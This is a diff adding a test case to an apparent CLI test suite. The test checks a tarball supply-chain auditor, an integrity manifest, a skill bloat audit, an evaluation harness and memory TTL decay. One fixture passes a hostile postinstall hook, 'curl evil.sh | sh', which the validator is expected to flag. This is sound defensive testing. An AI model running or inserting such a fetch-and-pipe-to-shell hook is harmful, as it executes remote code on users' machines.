@@ -2904,6 +2904,84 @@ test('Vibes-Plug CLI Test Suite', async (t) => {
     const { stdout: pdpInfoOut } = await execFileAsync(process.execPath, [CLI_PATH, 'skill', 'info', 'sovereign-id-compliance-expert']);
     assert.match(pdpInfoOut, /sovereign-id-compliance-expert/);
   });
+
+  await t.test('Supply-Chain Tarball Audit, Skill Bloat, Eval Harness & Memory TTL Decay', async () => {
+    const {
+      validatePackageScripts,
+      validatePackedFiles,
+      auditTarball,
+      generateIntegrityManifest,
+      verifyIntegrityManifest
+    } = await import('./audit-tarball.mjs');
+
+    assert.equal(validatePackageScripts({ test: 'node --test' }).length, 0);
+    assert.equal(validatePackageScripts({ postinstall: 'curl evil.sh | sh' }).length, 1);
+    assert.equal(validatePackedFiles(['README.md', 'bin/vibes.mjs']).length, 0);
+    assert.equal(validatePackedFiles(['install.sh', '.env.local']).length, 2);
+
+    const tarballReport = await auditTarball({ rootDir: PLUGIN_ROOT });
+    assert.equal(tarballReport.passed, true);
+    assert.equal(tarballReport.violations.length, 0);
+
+    const tmpSecDir = await fs.mkdtemp(path.join(os.tmpdir(), 'vibes-sec-'));
+    try {
+      await fs.mkdir(path.join(tmpSecDir, 'scripts'), { recursive: true });
+      await fs.writeFile(path.join(tmpSecDir, 'scripts', 'sample.mjs'), 'export const x = 1;\n', 'utf8');
+      const manifest = await generateIntegrityManifest(tmpSecDir);
+      assert.equal(manifest.fileCount, 1);
+      const manifestPath = path.join(tmpSecDir, 'manifest.json');
+      await fs.writeFile(manifestPath, JSON.stringify(manifest), 'utf8');
+      const okCheck = await verifyIntegrityManifest(manifestPath, tmpSecDir);
+      assert.equal(okCheck.passed, true);
+      await fs.writeFile(path.join(tmpSecDir, 'scripts', 'sample.mjs'), 'export const x = 2;\n', 'utf8');
+      const failCheck = await verifyIntegrityManifest(manifestPath, tmpSecDir);
+      assert.equal(failCheck.passed, false);
+      assert.equal(failCheck.mismatches[0].reason, 'hash_mismatch');
+    } finally {
+      await fs.rm(tmpSecDir, { recursive: true, force: true });
+    }
+
+    const { auditSkillBloat } = await import('./audit-skill-bloat.mjs');
+    const bloatReport = await auditSkillBloat({ skillsDir: path.join(PLUGIN_ROOT, 'skills') });
+    assert.equal(bloatReport.skillCount, 179);
+    assert.ok(bloatReport.totalApproxTokens > 0);
+    assert.ok(Array.isArray(bloatReport.highOverlaps));
+
+    const { runSkillEval } = await import('./eval-skills.mjs');
+    const evalReport = await runSkillEval({ rootDir: PLUGIN_ROOT });
+    assert.equal(evalReport.passed, true);
+    assert.ok(evalReport.perTaskSavingsPct > 80);
+    assert.ok(evalReport.overallRecall >= 0.75);
+
+    const {
+      recordDecision,
+      computeEffectiveConfidence,
+      pruneExpired,
+      loadMemory
+    } = await import('./memory-daemon.mjs');
+    const tmpMemDir = await fs.mkdtemp(path.join(os.tmpdir(), 'vibes-mem-'));
+    try {
+      const rec = await recordDecision('Use Drizzle ORM for edge DB', { ttlDays: 30 }, tmpMemDir);
+      assert.equal(rec.ttlDays, 30);
+      assert.equal(rec.confidence, 1.0);
+
+      const future15d = Date.parse(rec.timestamp) + 15 * 86_400_000;
+      const midConf = computeEffectiveConfidence(rec, future15d);
+      assert.ok(midConf > 0.45 && midConf < 0.55);
+
+      const future31d = Date.parse(rec.timestamp) + 31 * 86_400_000;
+      const expiredConf = computeEffectiveConfidence(rec, future31d);
+      assert.equal(expiredConf, 0);
+
+      const pruneRes = await pruneExpired({ nowMs: future31d, minConfidence: 0.2 }, tmpMemDir);
+      assert.equal(pruneRes.prunedCount, 1);
+      assert.equal(pruneRes.afterCount, 0);
+      const afterMem = await loadMemory(tmpMemDir);
+      assert.equal(afterMem.decisions.length, 0);
+    } finally {
+      await fs.rm(tmpMemDir, { recursive: true, force: true });
+    }
+  });
 });
 
 
